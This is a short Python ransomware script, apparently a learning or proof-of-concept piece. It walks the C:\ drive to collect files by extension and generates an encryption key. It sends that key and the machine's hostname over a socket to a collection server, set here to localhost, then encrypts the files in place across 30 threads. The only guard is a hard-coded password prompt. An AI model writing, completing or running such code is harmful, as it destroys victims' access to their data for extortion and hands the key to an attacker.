import os
import socket
from cryptography.fernet import Fernet
from datetime import datetime
from threading import Thread
from queue import Queue


#safegaurd for accidental run on device
safeguard = input("Please Enter the safegaurd password: ")
if safeguard != 'run!run':
    exit()

# file extentions to encrypt
encrypted_ext = ()

#Grab all files
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root + '\\' + file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

#Generate key
key = Fernet.generate_key()

hostname = os.getenv('COMPUTERNAME')

ip_address = 'localhost'
port = 83
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))


#Encrypt files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                f.write(Fernet.encrypt(key, data))
        except:
            pass
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()